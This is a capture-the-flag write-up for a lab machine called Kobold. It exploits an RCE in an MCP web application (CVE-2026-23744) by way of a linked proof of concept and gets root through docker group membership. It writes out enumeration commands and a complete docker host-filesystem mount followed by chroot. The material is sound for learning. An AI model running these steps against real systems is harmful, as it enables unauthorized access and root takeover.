# Kobold

> **Difficulty:** Easy  
> **Operating System:** Linux

---
## Initial Enumeration

As always, we start with some basic enumeration.

```bash
nmap -sV -sC 10.129.245.50

echo "10.129.245.50 kobold.htb" | sudo tee -a /etc/hosts
```

![](images/Pasted%20image%2020260722222329.png)

The scan reveals two interesting web services running on **ports 80 and 443**, alongside SSH.

Heading over to the website, two things immediately stand out:

1. The application revolves around **AI agents** and monitoring.
2. We discover what appears to be a valid username that might become useful later:

> **[admin@kobold.htb](mailto:admin@kobold.htb)**

![](images/Pasted%20image%2020260722223455.png)

Since web applications often expose additional functionality through virtual hosts, we enumerate subdomains. Because the target uses HTTPS with a self-signed certificate, we also use the **`-k`** option to ignore certificate validation.

```bash
gobuster vhost -u https://kobold.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -k
```

![](images/Pasted%20image%2020260722222752.png)

After discovering the subdomains, we add them to `/etc/hosts` so the browser can resolve them correctly.

![](images/Pasted%20image%2020260722224551.png)

![](images/Pasted%20image%2020260722224606.png)

The first thing worth checking is the version running on both services.

Inside the MCP application's settings, we find that it's running **version 1.4.2**.

![](images/Pasted%20image%2020260722230141.png)

A quick search reveals that this version is vulnerable to **CVE-2026-23744**, a Remote Code Execution vulnerability.

Searching GitHub for a proof of concept quickly leads us to the following exploit:

[https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC/blob/main/exploit.py](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC/blob/main/exploit.py)

Running the exploit immediately lands us a reverse shell.

![](images/Pasted%20image%2020260722230345.png)

One small annoyance is that the shell isn't stable and terminates after a short period of time.

To avoid repeatedly exploiting the target (because the reverse shell closes after a set period of time), we simply catch another reverse shell from the first one, giving ourselves a much more reliable session.

![](images/Pasted%20image%2020260722230633.png)

With a stable foothold, we retrieve the user flag.
```bash
cd ~

cat user.txt
```

![](images/Pasted%20image%2020260722230736.png)

---

## Privilege Escalation

Now comes the usual Linux enumeration.

First, we identify the available users.

```bash
cat /etc/passwd | grep home
```

![](images/Pasted%20image%2020260722231741.png)

Next, we check for scheduled tasks.

```bash
cat /etc/crontab
```

![](images/Pasted%20image%2020260722231847.png)

Then we inspect the running services.

```bash
systemctl list-units --type=service --state=running
```

![](images/Pasted%20image%2020260722232138.png)

And the configured timers.

```bash
systemctl list-timers
```

![](images/Pasted%20image%2020260722232205.png)

Checking listening ports often reveals internal services that may become useful later.

```bash
ss -tulpn
```

![](images/Pasted%20image%2020260722233302.png)

Finally, we inspect the group memberships.

```bash
groups

cat /etc/group | grep -E "alice|ben|operator"
# we greped what was displayed to us in the previous "cat /etc/passwd | grep home" command
```

![](images/Pasted%20image%2020260723152306.png)

This is where things become interesting.

Both **Ben** and **Alice** belong to the **operator** group, while **Alice** is also a member of the **docker** group.

Whenever I see Docker privileges, they immediately become one of the first things I investigate, since Docker is effectively equivalent to root when configured insecurely.

The first idea is to see whether we can switch to that group.

```bash
newgrp docker
```

![](images/Pasted%20image%2020260723153628.png)

Surprisingly, it works.

This tells us the group doesn't require a password (or has no usable password configured), allowing us to inherit Docker privileges.

Before going any further, it's worth confirming that Docker is actually running.

```bash
ps aux | grep -i docker
```

![](images/Pasted%20image%2020260723164059.png)

Since the daemon is active, we verify that we can communicate with it.

```bash
docker ps
```

![](images/Pasted%20image%2020260723165527.png)

Perfect.

We already have permission to interact with Docker.

Looking at the available images:

```bash
docker images
```

![](images/Pasted%20image%2020260723165643.png)

we notice a **privatebin/nginx-fpm-alpine** image already present on the host.

Instead of pulling another image, we simply reuse the existing one.

```bash
docker run -it --rm --user 0 -v /:/hostfs --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2
```

![](images/Pasted%20image%2020260723173146.png)

Here's what this command is doing:

- `--user 0` starts the container as **root**.
    
- `-v /:/hostfs` mounts the host's root filesystem inside the container.
    
- `--entrypoint /bin/sh` drops us directly into a shell.
    

Although we're technically root **inside the container**, we now have unrestricted access to the host's filesystem through **/hostfs**.

From there, we can either read sensitive files directly or fully transition into the host's environment.

```bash
cd /hostfs
chroot /hostfs /bin/sh
```

![](images/Pasted%20image%2020260723173336.png)

At this point we're effectively root on the host, allowing us to retrieve the root flag.

---

## Conclusion

I really enjoyed this machine. It starts with a modern web application vulnerability to gain the initial foothold, then shifts into Linux enumeration where paying attention to group memberships ends up being the key to privilege escalation.
The Docker abuse at the end is a great reminder that being in the `docker` group is practically the same as having root access.
Overall, a fun and realistic box with a few rabbit holes along the way.

**— 0xchnk**